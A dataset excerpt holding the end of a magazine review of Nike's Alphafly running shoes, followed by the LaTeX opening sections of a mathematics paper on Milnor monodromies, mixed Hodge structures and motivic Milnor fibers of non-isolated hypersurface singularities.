hard, I seemed to be flying through the air with every step. Sprinting in them had an edge of danger about it. Like the first time you get behind the wheel of a supercar and press on the gas a little harder to see what happens. In the right hands (feet?) the Alphafly is a complete game changer in racing.\nBut the biggest compliment I can pay to Nike's super shoe is that they make me want to run. At 38, the cushioning has thankfully spared me of the usual aches and pains I get in my Achilles, knees and lumbar. I started out with weekly 1km jogs, but am regularly hitting 5km every few days now. Like I said earlier, they're a revelation.\nIt's unlikely I'll be challenging Kipchoge anytime soon, but his trailblazing feat with the help of Nike has at least made me enjoy the sport of running these days. And that's a challenge I didn't think the Alphaflys would ever achieve.\nNike Air ZoomX Alphafly NEXT% are available for AED 1,049\nLINK: Nike\nStyle Life Culture\nDubai Chef: Troy Payne from The Pangolin\nI consent to Edgar storing my personal information (email address)\nWe do not sell, trade or rent Users personal identification information to others.\n\u00a9 2021 EDGAR Middle East, All rights reserved.\nA PINPOINT MEDIA PRODUCT\nMADE BY SIX\nWe do not sell, trade or rent user's personal identification information to others.\nAED0", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 42593}

{"text": "\\section{Introduction}\\label{introduction}\nThe Milnor monodromies of complex hypersurface singularities are important subjects in singularity theory.\nFor isolated hypersurface singular points, we have some algorithms or formulas to compute them.\nHowever, for non-isolated singular points, \nthere still remain some difficulties in computing them explicitly.\nIn this paper, we will show that\neven for non-isolated singular points,\nthe generalized eigenspaces of the Milnor monodromies for ``good\" eigenvalues\nhave some nice properties similar to those for isolated singular points.\nBy this result, we give an explicit formula for some parts of the Jordan normal forms of the Milnor monodromies.\n\nLet $f(x)\\in\\nPoly$ be a polynomial of $n(\\geq 2)$ variables with coefficients in $\\CC$ such that $f(0)=0$ and $V:=f^{-1}(0)\\subset \\CC^n$ the hypersurface defined by it.\nWe denote by $F_{f,0}$ the Milnor fiber of $f$ at $0$ and by\n\\[\\Phi_{j}\\colon H^{j}(F_{f,0};\\CC)\\simar H^{j}(F_{f,0};\\CC)\\]\nthe $j$-th Milnor monodromy for $j\\in\\ZZ$.\nIf the origin $0\\in V$ is an isolated singular point of $V$,\nthe Milnor fiber $F_{f,0}$ is homotopic to a bouquet of some $(n-1)$-spheres $S^{n-1}$ by a celebrated theorem of Milnor~\\cite{MIL}.\nThis implies that the reduced cohomology groups $\\tl{H}^{j}(F_{f,0};\\CC)$ vanish except for $j=n-1$.\nHowever, if $0\\in V$ is a non-isolated singular point,\nwe can not expect to have such a concentration in general.\nOn the other hand,\nfor a polynomial $f$ non-degenerate at $0$,\nVarchenko~\\cite{Varchenko} described explicitly the monodromy zeta function\n\\[\\zeta_{f,0}(t):=\\prod_{j\\in\\ZZ}\\det(\\Id-t\\Phi_{j})^{(-1)^{j}}\\in\\CC(t)\\]\nin terms of the Newton polyhedron $\\Gamma_{+}(f)$.\nIf $0\\in V$ is an isolated singular point of $V$,\nthe $(n-1)$-th Milnor monodromy $\\Phi_{n-1}$ is the only non-trivial one.\nTherefore, in this case, we obtain a formula for the characteristic polynomial of $\\Phi_{n-1}$.\nHowever, if $0\\in V$ is a non-isolated singular point, Varchenko's formula \ndoes not tell us any explicit information about the characteristic polynomial of each Milnor monodromy $\\Phi_{j}$.\n\nFor non-isolated singular points,\nthere is a similar difficulty also for the mixed Hodge structures of the cohomologies of the Milnor fibers.\nRecall that each cohomology group $H^{j}(F_{f,0};\\QQ)$ of $F_{f,0}$ is endowed with a mixed Hodge structure $(H^{j}(F_{f,0};\\QQ),F^{\\bullet}, W_{\\bullet})$ defined by Steenbrink~\\cite{STEVAN} in the case where $0\\in V$ is an isolated singular point and\nby Navarro~\\cite{Navsur} and M. Saito~\\cite{MHM} in the case where $0\\in V$ is a non-isolated singular point.\nFor $j\\in\\ZZ$ and an eigenvalue $\\lambda\\in\\CC$ of the Milnor monodromy $\\Phi_{j}$,\nwe denote by \n\\[H^{j}(F_{f,0};\\CC)_{\\lambda}\\subset H^{j}(F_{f,0};\\CC)\\]\nthe generalized eigenspace of $\\Phi_{j}$ for $\\lambda$.\nFor $p,q\\in\\ZZ$, \nwe denote by $h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))$\nthe $(p,q)$-mixed Hodge number for the eigenvalue $\\lambda$ of the $j$-th cohomology group of $F_{f,0}$ i.e. the dimension of $\\GR^{p}_{F}\\GR^{W}_{p+q}H^{j}(F_{f,0};\\CC)_{\\lambda}$.\nFor $\\lambda\\in\\CC$, we define a polynomial $E_{\\lambda}(F_{f,0};u,v)\\in\\ZZ[u,v]$ with coefficients in $\\ZZ$ by\n\\[E_{\\lambda}(F_{f,0};u,v):=\\sum_{p,q\\in\\ZZ}\\sum_{j\\in\\ZZ}(-1)^{j}h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))u^pv^q.\\]\nBy using a description of the Motivic Milnor fiber of $f$ at $0$ (see Theorem~\\ref{motivicdesc}),\nwe can describe $E_{\\lambda}(F_{f,0};u,v)$ explicitly in terms of certain polynomials defined by the Newton polyhedron $\\Gamma_{+}(f)$ (see Corollary~\\ref{epolycomp1}).\nMoreover, if $0\\in V$ is an isolated singular point of $V$,\nas in the previous discussion about Varchenko's formula,\nwe can describe $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$ by our formula.\nIn particular, we obtain an explicit formula for the Jordan normal form of $\\Phi_{n-1}$ (see Matsui-Takeuchi~\\cite{MT}).\nOn the other hand, if $0\\in V$ is a non-isolated singular point,\nthe formula for $E_{\\lambda}(F_{f,0};u,v)$ does not tell us any explicit information about each mixed Hodge number $h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))$.\n\nIn this paper, \nwe follow an idea of Takeuchi-Tibar~\\cite{TakeTib} for monodromies at infinity\nand overcome the above-mentioned difficulties by introducing a finite subset $R_{f}\\subset \\CC$ of ``bad'' eigenvalues of the Milnor monodromies (see Definition~\\ref{Rf}) as follows.\n\\begin{thm}[see Theorem~\\ref{main1}]\\label{intromain1}\nAssume that $f$ is non-degenerate at $0$.\nThen, for any $\\lambda\\notin R_{f}$ we have a concentration:\n\\[\\tl{H}^{j}(F_{f,0};\\CC)_{\\lambda}\\simeq 0\\quad ( j\\neq n-1).\\]\n\\end{thm}\nNote that a more general but less explicit concentration result was given in \\cite[Corollary~6.1.7]{DIMCA}. \nBy this theorem and Varchenko's formula,\nwe can compute the multiplicities of eigenvalues $\\lambda\\notin R_{f}$ in $\\Phi_{n-1}$ as follows.\n\\begin{cor}(see Corollary~\\ref{multico})\nIn the situation of Theorem~\\ref{intromain1},\nfor any $\\lambda\\notin R_{f}$ the multiplicity of the eigenvalue $\\lambda$ in the Milnor monodromy $\\Phi_{n-1}$ is equal to that of the factor $(1-\\lambda t)$ in a rational function\n\\[\\prod_{\\emptyset\\neq I\\subset \\{1,\\dots,n\\}}\\prod_{i=1}^{k_{I}}(1-t^{d_{I,i}})^{(-1)^{n-|I|}\\mathrm{Vol}_{\\ZZ}(\\Gamma_{I,i})}.\\]\nFor the definitions of $k_{I}$, $\\Gamma_{I,i}$, $d_{I,i}$ and $\\mathrm{Vol}_{\\ZZ}(\\Gamma_{I,i})$, see Section~\\ref{chapmil}.   \n\\end{cor}\n\nMoreover, for such $\\lambda$ we obtain the mixed Hodge numbers $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$ by our formula for $E_{\\lambda}(F_{f,0};u,v)$.\n\nIf $0\\in V$ is an isolated singular point,\nthe filtration on $H^{n-1}(F_{f,0};\\CC)_{\\lambda}$ induced by the weight filtration coincides with the monodromy filtration of $\\Phi_{n-1}$.\nThis implies that \nthe Jordan normal form of $\\Phi_{n-1}$ for an eigenvalue $\\lambda$\ncan be described by the mixed Hodge numbers $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$.\nOn the other hand, to the best of our knowledge,\nif $0\\in V$ is a non-isolated singular point of $V$,\nthe geometric meaning of the weight filtrations on $H^{j}(F_{f,0};\\CC)_{\\lambda}$ is not fully understood yet.\nFor this problem, we obtain the following.\n\\begin{thm}[see Theorem~\\ref{main2}]\\label{intromain2}\nIn the situation of Theorem~\\ref{intromain1},\nfor $\\lambda\\notin R_{f}$\nthe filtration on $H^{n-1}(F_{f,0};\\CC)_{\\lambda}$ induced by the weight filtration\non $H^{n-1}(F_{f,0};\\QQ)$ coincides with the monodromy filtration of $\\Phi_{n-1}$ centered at $n-1$.\n\\end{thm}\n\nWe denote by $J_{k,\\lambda}$ the number of the Jordan blocks with size $k$ for an eigenvalue $\\lambda$ in the Jordan normal form of the Milnor monodromy $\\Phi_{n-1}$.\nCombining the above theorem with our description of $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$,\nfor any eigenvalue $\\lambda\\notin R_{f}$ we can

$f(0)=0$.\nFor a natural number $m\\geq 1$ and a positive real number $r>0$,\nwe denote by $B(0,r)$ the open ball in $\\CC^m$ centered at the origin $0$ with radius $r$.\nSet $B(0,r)^*:=B(0,r)\\setminus \\{0\\}$.\n\n\\begin{thm}[Milnor~\\cite{MIL}]\\label{milfib}\nFix a sufficiently small $\\epsilon>0$.\nThen for a sufficiently small $(\\epsilon \\gg)\\eta>0$ the restriction of $f\\colon \\CC^n\\lr \\CC$\n\\[f\\colon B(0,\\epsilon)\\cap f^{-1}(B(0,\\eta)^{*})\\lr B(0,\\eta)^*\\]\nis a locally trivial fibration.\nMoreover, if the origin $0\\in\\CC^n$ is an isolated singular point of $V:=f^{-1}(0)\\subset \\CC^n$,\nits fiber is homotopy equivalent to a bouquet (wedge sum) of some $(n-1)$-dimensional spheres.\n\\end{thm}\n\nThis locally trivial fibration does not depend on the choices of sufficiently small $\\epsilon$ and $\\delta$ up to diffeomorphism (see section 1.2 of \\cite{OkNoCo}) and is called the \\textit{Milnor fibration} of $f$ at $0$, and its general fiber $F_{f,0} $ is called the \\textit{Milnor fiber} of $f$ at $0$.\nBy the above theorem, \nif $0$ is an isolated singular point of $V$,\nit follows that the reduced cohomology group $\\tl{H}^{j}(F_{f,0};\\CC)$ vanishes for $j\\neq n-1$.\nWe get an action of the fundamental group $\\pi_{1}(B(0,\\eta)^*)$ on $H^{j}(F_{f,0};\\CC)$, and thus can define an automorphism\n\\[\\Phi_{j}\\colon H^{j}(F_{f,0};\\CC)\\simar H^{j}(F_{f,0};\\CC)\\]\nfor each $j\\in\\ZZ$.\nWe call it the \\textit{$j$-th Milnor monodromy} of $f$ at $0$.\nIt is well-known that $\\Phi_{j}$ is a quasi-unipotent linear operator for any $j\\in\\ZZ$.\nFor $\\lambda\\in\\CC$ and $j\\in\\ZZ$ denote by $H^{j}(F_{f,0};\\CC)_{\\lambda}$ the generalized eigenspace of $\\Phi_{j}$ for the eigenvalue $\\lambda$.\nLet $\\Phi_{j,\\lambda}$ be the restriction of $\\Phi_{j}$ to $H^{j}(F_{f,0};\\CC)_{\\lambda}$.\nTo study the eigenvalues of the Milnor monodromies $\\Phi_{j}$ and their multiplicities,\nwe introduce the following rational function.\n\n\\begin{defi}\nIn the situation as above, we define the \\textit{monodromy zeta function $\\zeta_{f,0}(t)\\in\\CC(t)$ of $f$ at $0$} by\n\\[\\zeta_{f,0}(t):= \\prod_{j\\in\\ZZ}\\det(\\Id- t\\Phi_{j})^{(-1)^{j}}\\in\\CC(t),\\]\nwhere $\\Id$ is the identity map of $H^{j}(F_{f,0};\\CC)$ to itself.\n\\end{defi}\n\nSince $\\Phi_{j}$ are automorphisms,\nthe polynomials $\\det(\\Id- t\\Phi_{j})$ determine the characteristic polynomials of $\\Phi_{j}$.\nTo introduce a formula for the monodromy zeta functions of Varchenko~\\cite{Varchenko},\nwe prepare some notions.\n\n\\begin{defi}\\label{newtontpoly}\nLet $f(x)=\\sum_{\\alpha\\in\\ZZ^n}a_{\\alpha}x^{\\alpha}\\in\\CC[x_{1}^{\\pm},\\dots,x_{n}^{\\pm}]$ be a Laurent polynomial with coefficients in $\\CC$.\nThen the \\textit{Newton polytope} $\\Ntpo\\subset \\RR^n$ of $f$ is the convex hull of\nthe set $\\supp(f):=\\{\\alpha\\in\\ZZ^n\\ |\\ a_{\\alpha}\\neq 0\\}\\subset \\RR^n$ in $\\RR^n$. \n\\end{defi}\n\n\\begin{defi}\\label{newtonph}\nLet $f(x)=\\sum_{\\alpha\\in\\ZZpn}a_{\\alpha}x^{\\alpha}\\in\\nPoly$ be a polynomial with coefficients in $\\CC$ such that $f(0)=0$.\n\\begin{enumerate}\n\\item The \\textit{Newton polyhedron} $\\Gamma_{+}(f)\\subset \\RR^n$ of $f$ at the origin $0\\in\\CC^n$ is the convex hull of $\\bigcup_{\\alpha\\in\\supp(f)}\\{\\alpha +\\RRpn\\}\\subset \\RR^n$ in $\\RR^n$.\n\\item The \\textit{Newton boundary} $\\Gamma_{f}\\subset \\Gamma_{+}(f)$ of $f$ is \nthe union of the compact faces of $\\Ntph$.\n\\item We say that the polynomial $f$ is \\textit{convenient} if $\\Gamma_{+}(f)$ intersects the positive part of each coordinate axis of $\\RR^n$.\n\\end{enumerate}\n\\end{defi}\n\nFor a Laurent polynomial $f(x)=\\sum_{\\alpha\\in\\ZZ^n}a_{\\alpha}x^{\\alpha}$\nand a polytope $F$ in $\\RR^n$,\nwe set $f_{F}(x):=\\sum_{\\alpha\\in F}a_{\\alpha}x^{\\alpha}$.\n\\begin{defi}\\label{nondeg}\nLet $f(x)\\in\\CC[x_{1}^{\\pm},\\dots,x_{n}^{\\pm}]$ be a Laurent polynomial with coefficients in $\\CC$.\nWe say that $f$ is \\textit{non-degenerate} if\nfor any face $F$ of $\\Ntpo$\nthe hypersurface $\\{x\\in\\CS^n\\ |\\ f_{F}(x)=0\\}$ in $\\CS^n$ is smooth and reduced.\n\\end{defi}\n\n\\begin{defi}\\label{nondegatzero}\nLet $f(x)\\in\\nPoly$ be a non-constant polynomial with coefficients in $\\CC$ such that $f(0)=0$.\nThen we say that $f$ is \\textit{non-degenerate at $0$} if\nfor any compact face $F$ of $\\Ntph$ the hypersurface $\\{x\\in\\CS^n\\ |\\ f_{F}(x)=0\\}$ in $\\CS^n$ is smooth and reduced.\n\\end{defi}\n\nLet $F$ be a lattice polytope in $\\RR^n$ (i.e. its vertices are in $\\ZZ^n$).\nWe denote by $\\mathbf{L}_{F}$ (resp. $\\Aff{F}$) the minimal linear (resp. affine) subspace of $\\RR^n$ which contains $F$\nand set $M_{F}:=\\mathbf{L}_{F}\\cap \\ZZ^n$.\nNote that $M_{F}$ is a lattice (i.e. a finite rank free $\\ZZ$-module)\nand we have $M_{F}\\otimes_{\\ZZ}\\RR\\simeq \\mathbf{L}_{F}$.\nAssume that $\\dim{F}<n$ and $0\\notin \\Aff{F}$.\nIn this case there exists a unique primitive vector $v_{F}$ in the dual lattice $M_{F}^{*}$ of $M_{F}$ which takes a positive constant value on $\\Aff{F}$.\n\n\\begin{defi}\\label{latdist}\nWe define the \\textit{lattice distance} $d_{F}\\in\\ZZ_{\\geq 1}$ of $F$ from the origin $0\\in\\mathbf{L}_{F}$ to be the value of $v_{F}$ on $\\Aff{F}$. \n\\end{defi}\n\nLet $f(x)\\in\\nPoly$ be a non-constant polynomial with coefficients in $\\CC$ such that $f(0)=0$.\nFor a subset $I\\subset \\{1,\\dots,n\\}$, set \n\\[\n\\RR^{I}:=\\{(x_{1},\\dots,x_{n})\\in\\RR^n\\ |\\ x_{i}=0\\ (i\\notin I)\\}\\simeq \\RR^{|I|},\\]\nand let $\\Gamma_{I,1},\\dots,\\Gamma_{I,k_{I}}$ be the $(|I|-1)$-dimensional compact faces of $\\RR^{I}\\cap \\Ntph$.\nFor $1\\leq i\\leq k_{I}$, we define an integer $d_{I,i}\\in\\ZZ_{>0}$ to be the lattice distance of $\\Gamma_{I,i}$ from the origin $0\\in\\RR^I$.\nLet $\\Vol_{\\ZZ}(\\Gamma_{I,i})\\in\\ZZ_{>0}$ be the $(|I|-1)$-dimensional normalized volume of $\\Gamma_{I,i}$.\nThen we have the following.\n\n\\begin{thm}[Varchenko~\\cite{Varchenko}]\\label{Varform}\nAssume that $f$ is non-degenerate at $0$.\nThen we have\n\\begin{align}\\label{Varf}\n\\zeta_{f,0}(t)=\\prod_{\\emptyset\\neq I\\subset \\{1,\\dots,n\\}}\\prod_{i=1}^{k_{I}}(1-t^{d_{I,i}})^{(-1)^{|I|-1}\\mathrm{Vol}_{\\ZZ}(\\Gamma_{I,i})}.\n\\end{align}\n\\end{thm}\n\nThe monodromy zeta function $\\zeta_{f,0}(t)$ being an alternating product of \nthe polynomials $\\det(\\Id- t\\Phi_{j})$,\nwe can not compute the eigenvalues of each Milnor monodromy $\\Phi_{j}$ and their multiplicities by Varchenko's formula in general.\nRecall that if $0\\in V$ is an isolated singular point of $V$\nwe have $H^{j}(F_{f,0};\\CC)=0$ for $j\\neq 0,n-1$ and\n$\\det(\\Id- t\\Phi_{0})=1-t$ (here we assumed $n\\geq 2$).\nIn this case we thus obtain\n\\[\\zeta_{f,0}(t)=(1-t)\\cdot\\det(\\Id-t\\Phi_{n-1})^{(-1)^{n-1}}\\]\nand can compute the eigenvalues of $\\Phi_{n-1}$ and their multiplicities by Varchenko's formula.\nLet us recall a well-known condition for the origin $0\\in V$ to be an isolated singular point.\n\\begin{prop}\nIf $f$ is convenient and non-degenerate at $0$, then the origin $0$ is a smooth or an isolated singular point of $V$.\n\\end{prop}\n\nTherefore, if $f$ is convenient and non-degenerate at $0$,\nwe can describe the eigenvalues of the Milnor monodromy $\\Phi_{n-1}$ and their multiplicities by the Newton polyhedron $\\Ntph$.\nIn Section~\\ref{chapmain}, \nwe will show that even if $f$ is not convenient, we can compute the multiplicities of some ``good'' eigenvalues of $\\Phi_{n-1}$ by Varchenko's formula (see Corollary~\\ref{multico}).\n\nRecall that the cohomology group $H^{j}(F_{f,0};\\QQ)$ of the Milnor fiber $F_{f,0}$ is endowed with a mixed Hodge structure $(H^{j}(F_{f,0};\\QQ), F^{\\bullet}, W_{\\bullet})$ defined by Steenbrink~\\cite{STEVAN} in the case where $0\\in V$ is isolated singular point, by Navarro~\\cite{Navsur} and M.Saito~\\cite{MHM} in the case where $0\\in V$ is a non-isolated singular point.\nTo introduce a property of the weight filtration $W_{\\bullet}$, we recall the following notion.\n\\begin{defi}\nLet $r\\in\\ZZ_{\\geq 1}$ and $N$ be a nilpotent endomorphism of a finite dimensional $\\CC$-vector space $H$ such that $N^{r+1}=0$.\nThen, there exists an increasing filtration $\\{W_{k}\\}_{k\\in\\ZZ}$ on $H$, which is uniquely determined by the following conditions:\n\\begin{enumerate}\n\\item $W_{-1}=\\{0\\}$ and $W_{2r}=H$,\\\\\n\\item $N(W_{k})\\subset W_{k-2}$ \\quad and\\\\\n\\item $N^{k}\\colon W_{r+k}/W_{r+k-1}\\simar W_{r-k}/W_{r-k-1}$\\mbox{\\ \\ for $0\\leq k\\leq r$}.\n\\end{enumerate}\nWe call it the \\textit{monodromy filtration of $N$ centered at $r$}.\n\\end{defi}\nNote that the number of Jordan blocks (for the eigenvalue $0$) with size $k\\in \\ZZ_{\\geq 1}$ in the Jordan normal form of $N$ is equal to\n\\[\\dim{W_{r+1-k}/W_{r-k}}-\\dim{W_{r-1-k}/W_{r-2-k}}.\\]\nWe decompose the $(n-1)$-th Milnor monodromy $\\Phi_{n-1}$ into the semisimple part $\\Phi_{n-1}^{s}$ and the unipotent part $\\Phi_{n-1}^{u}$ as $\\Phi_{n-1}=\\Phi_{n-1}^{s}\\Phi_{n-1}^{u}$.\nIf $0\\in V$ is an isolated singular point,\nthe filtration on $H^{n-1}(F_{f,0};\\CC)_{\\lambda}$ induced by the weight filtration is the monodromy filtration of the logarithm $\\log{\\Phi_{n-1}^{u}}$ of $\\Phi_{n-1}^{u}$ centered at $n-1$ (resp. $n$) for $\\lambda\\neq 1$ (resp. $\\lambda=1$) (see \\cite{STEVAN}).\nTherefore, we can recover the Jordan normal form of $\\Phi_{n-1}$ for the eigenvalue $\\lambda$ from the dimensions of the graded pieces $\\GR^{W}_{k}H^{n-1}(F_{f,0};\\CC)_{\\lambda}$.\nOn the other hand, if $0\\in V$ is a non-isolated singular point,\nwe can not expect such a relationship between the weight filtration $W_{\\bullet}$ and the Milnor monodromy.\nIn Section~\\ref{chapmain}, we will show that even if $f$ is not convenient (so $0\\in V$ may be a non-isolated singular point) for a ``good'' eigenvalue $\\lambda$ the filtration on $H^{n-1}(F_{f,0};\\CC)_{\\lambda}$ induced by $W_{\\bullet}$ coincides with the monodromy filtration (see Theorem~\\ref{main2}).\n\nFinally, we describe the cohomology groups of the Milnor fibers and their mixed Hodge structures in terms of the nearby cycle functors.\nFor details, see~\\cite{DIMCA}, \\cite{HTT}, \\cite{KS} and \\cite{MHM}. \nFor a field $\\KK$,\nwe denote by $\\KK_{\\CC^n}$ the constant sheaf on $\\CC^n$ with stalk $\\KK$ and by $\\psi_{f}(\\KK_{\\CC^n})$ the nearby cycle sheaf of $f$.\nRecall that $\\psi_{f}(\\KK_{\\CC^n})$ is an object of the derived category of constructible sheaves $\\DBC{V}$ on $V=f^{-1}(0)$.\nThen, for any $j\\in\\ZZ$\nthere exists an isomorphism \n\\[H^{j}(\\psi_{f}(\\KK_{\\CC^n})_{0})\\simeq H^{j}(F_{f,0};\\CC)\\]\n(see e.g. Proposition~4.2.2 of \\cite{DIMCA}).\nMoreover, there exists an automorphism of the complex $\\psi_{f}(\\KK_{\\CC^n})$, called the monodromy automorphism.\nThe automorphism on $H^{j}(\\psi_{f}(\\KK_{\\CC^n})_{0})\\simeq H^{j}(F_{f,0};\\KK)$ induced by it coincides with the Milnor monodromy $\\Phi_{j}$.\nFor a complex number $\\lambda\\in\\CC$, we denote by $\\psi_{f,\\lambda}(\\CC_{\\CC^n})$ the $\\lambda$-part of $\\psi_{f}(\\CC_{\\CC^n})$ with respect to the monodromy automorphism.\nThen the $j$-th cohomology $H^{j}(\\psi_{f,\\lambda}(\\CC_{\\CC^n})_{0})$ is isomorphic to the generalized eigenspace $H^{j}(F_{f,0};\\CC)_{\\lambda}$ of $\\Phi_{j}$ for the eigenvalue $\\lambda$.\nRecall that the complexes\n\\[\\KK_{\\CC^n}[n]\\in\\DBC{\\CC^n}\\]\nand\n\\[{}^p\\psi_{f}(\\KK_{\\CC^n}[n]):=\\psi_{f}(\\KK_{\\CC^n}[n-1])\\in\\DBC{V}\\]\nare objects of the Abelian categories of perverse sheaves $\\Perv{\\CC^n}\\subset{\\DBC{\\CC^n}}$ and $\\Perv{V}\\subset \\DBC{V}$ respectively.\nMoreover, $\\QQ_{\\CC^n}[n]$ and ${}^p\\psi_{f}(\\QQ_{\\CC^n}[n])$ are the underlying perverse sheaves of the mixed Hodge modules $\\QQ^H_{\\CC^n}[n]$ and\n$\\psi_{f}^{H}(\\QQ^{H}_{\\CC^n}[n])$ respectively.\nLet $j_{0}^{*}\\psi_{f}^{H}(\\QQ^{H}_{\\CC^n})$ be the pull-back of the mixed Hodge module $\\psi_{f}^{H}(\\QQ^{H}_{\\CC^n})\\in \\DBMHM{V}$ by the inclusion $j_{0}\\colon \\{0\\}\\hlr V$.\nThis is an object of the derived category of mixed Hodge modules $\\DBMHM{\\{0\\}}$ (which is equivalent to the derived category of polarizable mixed Hodge structures),\nand its underlying complex is ${}^p\\psi_{f}(\\QQ_{\\CC^n}[n])_{0}(=j_{0}^{-1}({}^p\\psi_{f}(\\QQ_{\\CC^n}[n])))$.\nThis implies that the cohomology groups of ${}^p\\psi_{f}(\\QQ_{\\CC^n}[n])_{0}$ have mixed Hodge structures.\nThus we can endow $H^{j}(F_{f,0};\\QQ)$ with a mixed Hodge structure for each $j\\in\\ZZ$.\nNote that in the case where $0\\in V$ is an isolated singular point,\nthe mixed Hodge structure of $H^{n-1}(F_{f,0};\\QQ)$ was defined by Steenbrink~\\cite{STEVAN} more elementarily.\n\n\\section{Motivic Milnor fibers}\\label{chapmot}\n\\subsection{Motivic Milnor fibers}\\label{subsecmot}\nLet $\\mu_{m}=\\{x\\in\\CC\\ |\\ x^m=1\\}$ be the cyclic group of order $m\\in\\ZZ_{\\geq 1}$.\nLet $\\muhat=\\varprojlim_{m}\\mu_{m}$ be the projective limit with respect to the morphisms $\\mu_{md}\\lr \\mu_{m}\\ (x\\mapsto x^{d})$.\nLet $K_{0}^{\\muhat}(\\mathrm{Var_{\\CC}})$ be the Abelian group generated by the symbols ${[X\\circlearrowleft\\muhat]}$ for algebraic varieties $X$ over $\\CC$ with a good $\\muhat$-action (i.e. a $\\muhat$-action induced by a good $\\mu_{m}$-action for some $m\\in\\ZZ_{\\geq 1}$), and divided by some relations (see \\cite{DLarc}).\nFor $[X\\circlearrowleft\\muhat]$ and $[X'\\circlearrowleft\\muhat]$ in $K_{0}^{\\muhat}(\\mathrm{Var_{\\CC}})$\nwe can endow the product $X\\times X'$ with a good $\\muhat$ action and\ndefine their multiplication $[X\\circlearrowleft\\muhat]\\cdot[X'\\circlearrowleft\\muhat]$ by\n$[X\\times X' \\circlearrowleft \\muhat]$.\nIn this way, we can endow $K_{0}^{\\muhat}(\\mathrm{Var_{\\CC}})$ with a ring structure and call it the \\textit{monodromic Grothendieck ring}.\nSet $\\LL:=[\\CC\\circlearrowleft\\muhat]\\in K_{0}^{\\muhat}(\\mathrm{Var_{\\CC}})$, where $\\CC\\circlearrowleft\\muhat$ is the affine line with the trivial $\\muhat$-action.\nWe denote by $\\calM^{\\muhat}_{\\CC}$ the localization of the ring $K_{0}^{\\muhat}(\\mathrm{Var_{\\CC}})$ obtained by inverting $\\LL$.\nFor a non-constant polynomial $f(x)\\in\\nPoly$ such that $f(0)=0$,\nDenef-Loeser~\\cite{DLarc} defined the \\textit{motivic Milnor fiber} $\\calS_{f,0}$ of $f$ as an object in $\\calM_{\\CC}^{\\muhat}$ by using the theory of arc spaces.\nIt is an ``incarnation of the Milnor fiber of $f$ at $0$''\nin the ring $\\calM^{\\muhat}_{\\CC}$ as we shall see in Theorem~\\ref{HOREAL} below.\nLet $X$ be an algebraic variety with a good $\\mu_{m}$-action for some $m\\in\\ZZ_{\\geq 1}$.\nThe generator of $\\mu_{m}$ defines an automorphism $l\\colon X\\simar X$ of $X$ such that $l^m$ is the identity map.\nEach cohomology group $H^{j}_{c}(X;\\QQ)$ with compact support is endowed with Deligne's mixed Hodge structure $(H^{j}_{c}(X;\\QQ), F^{\\bullet},W_{\\bullet})$ with an automorphism \n\\begin{align}\\label{actionl}\n(l^*)^{-1}\\colon H^{j}_{c}(X;\\QQ)\\simar H^{j}_{c}(X;\\QQ).\n\\end{align}\nFor $\\lambda\\in\\CC$, we denote by \n\\[H^{j}_{c}(X;\\CC)_{\\lambda}\\subset H^j_{c}(X;\\CC)\\]\nthe generalized eigenspace of the automorphism for the eigenvalue $\\lambda$.\nMoreover, for $p,q\\in\\ZZ$ and $\\lambda\\in\\CC$\nwe define $h^{p,q}_{\\lambda}(H^{j}_{c}(X;\\CC))\\in\\ZZ_{\\geq 0}$ to be the dimension of\n$\\GR^{p}_{F}\\GR^{W}_{p+q}H^{j}_{c}(X;\\CC)_{\\lambda}$.\nThen for $\\lambda\\in\\CC$ we can define a ring homomorphism $E_{\\lambda}(\\ \\cdot\\ ;u,v)$ of $\\calM^{\\muhat}_{\\CC}$ to the polynomial ring $\\ZZ[u,v]$\nwhich sends $[X\\circlearrowleft\\muhat]\\in\\calM_{\\CC}^{\\muhat}$ to\nthe polynomial\n\\[E_{\\lambda}([X\\circlearrowleft\\muhat];u,v):=\\sum_{p,q\\in\\ZZ}\\sum_{j\\in\\ZZ}(-1)^{j}h^{p,q}_{\\lambda}(H^{j}_{c}(X;\\CC))u^pv^q\\in\\ZZ[u,v].\\]\nFor an element $\\sum_{i}[X_{i}\\circlearrowleft\\muhat]\\in\\calM_{\\CC}^{\\muhat}$ and $\\lambda\\in\\CC$\nwe call the polynomial $\\sum_{i}E_{\\lambda}([X_{i}\\circlearrowleft\\muhat];u,v)$ the \\textit{Hodge realization for $\\lambda$} of $\\sum_{i}[X_{i}\\circlearrowleft\\muhat]$. \nFor $\\lambda\\in\\CC$ we denote by $E_{\\lambda}(F_{f,0};u,v)$ the \\textit{equivariant Hodge-Deligne polynomial for the eigenvalue $\\lambda$} of the mixed Hodge structures of the cohomology groups of the Milnor fiber $F_{f,0}$ with the automorphisms $\\Phi_{j}$, i.e.\n\\[E_{\\lambda}(F_{f,0};u,v):=\\sum_{p,q\\in\\ZZ}\\sum_{j\\in\\ZZ}(-1)^{j}h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))u^pv^q\\in\\ZZ[u,v],\\]\nwhere $h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))$ is the dimension of \n$\\GR^{p}_{F}\\GR^{W}_{p+q}H^{j}(F_{f,0};\\CC)_{\\lambda}$.\nThen we have the following theorem of Denef-Loeser~\\cite{DLarc}.\n\\begin{thm}[Denef-Loeser~\\cite{DLarc}]\\label{HOREAL}\nFor any $\\lambda\\in\\CC$ we have\n\\[E_{\\lambda}(\\calS_{f,0};u,v)=E_{\\lambda}(F_{f,0};u,v).\\]\n\\end{thm}\n\nOriginally, $\\calS_{f,0}$ is defined abstractly in \\cite{DLarc} by using the theory of arc spaces.\nHowever, by using a log resolution of the pair $(\\CC^n, f^{-1}(0))$,\nwe can describe $\\calS_{f,0}$ explicitly as follows.\nLet $Y$ be a smooth algebraic variety over $\\CC$ and $\\pi\\colon Y\\lr \\CC^n$ be a proper morphism such that $\\pi^{-1}(V)$ is a normal crossing divisor of $Y$ and $\\pi$ induces an isomorphism $Y\\setminus \\pi^{-1}(V)\\simar \\CC^n \\setminus V$.\nLet\n\\[\\pi^{-1}(V)=E_{1}\\cup\\dots\\cup E_{m}\\]\nbe the irreducible decomposition of 